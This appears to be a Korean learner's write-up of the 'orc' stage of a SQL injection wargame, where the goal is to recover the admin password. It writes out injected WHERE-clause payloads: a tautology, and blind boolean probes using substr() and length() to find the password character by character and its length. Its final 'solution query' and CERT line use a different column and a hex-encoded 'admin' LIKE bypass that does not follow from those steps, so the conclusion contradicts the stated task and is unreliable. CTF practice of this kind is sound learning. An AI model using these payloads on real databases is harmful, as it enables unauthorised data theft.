## Q4. orc _ 
<img src="/photo/prob_04.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: X <br> 문제 사항: admin의 패스워드를 찾아라.
### 해결책

```
먼저 쿼리문이 참이 되도록 만들어 봄
=> 논리를 이용
```
```diff
# 현재 쿼리문: where id='admin' and pw='' || 1--+
```
```
but. admin은 표시되나 문제가 해결되지는 않음
문제 해결을 위해서는 admin의 패스워드가 필요함
=> 패스워드가 문자열이므로 sql 문자열 관련 함수를 찾아봄
=> SUBSTR()함수를 찾아 이를 시도해봄
```
```diff
# 현재 쿼리문: where id='admin' and pw='' || substr(pw,1,1) = 'a' --+
```
```
but. 아무것도 뜨지 않음
=> a가 아닌 다양한 문자열 넣어봄
=> '0'에서 admin이 떠서 참이 되는 것을 확인함
```
```diff
# 현재 쿼리문: where id='admin' and pw='' || substr(pw,1,1) = '0' --+
```
```
위의 쿼리가 맞다는 것을 확인함
=> substr()함수 안의 시작위치 바꿔서 시도함
but. 시작위치가 얼마나 될지 확신을 먼저 확인해야함
=> sql 문자열 길이 함수를 찾아봄
=> length()함수를 찾아 이를 시도해봄
```
```diff
# 현재 쿼리문: where id='admin' and pw='' || length(pw) > 1 --+
```
```
admin이 떠서 이 쿼리가 참인것을 확인함
=> 숫자 증가시키며 패스워드 길이 찾음
=> 반복되는 작업이므로 파이썬 코드를 이용함
=> 밑의 쿼리가 참이므로 패스워드 길이 = 8
```
```diff
# 현재 쿼리문: where id='admin' and pw=''|| length(pw)=8--+
```
<참고> Python 코드 : [패스워드 길이]()
```
해결 쿼리문: id='guest' and no=0 || id like 0x61646d696e
```
### CERT <br> ?no=0 || id like 0x61646d696e

### 느낀점
```diff
+ SQL 문자열 관련 함수를 새롭게 알게 되었다.
+ 1. SUBSTR(컬럼명 혹은 문자열, 시작위치, 골라낼 글자 수)
+ 2. LENGTH(컬럼명 혹은 문자열)

+ 파이썬의 urllib를 새롭게 배웠다.
```
<참고> [Python_Urllib]()
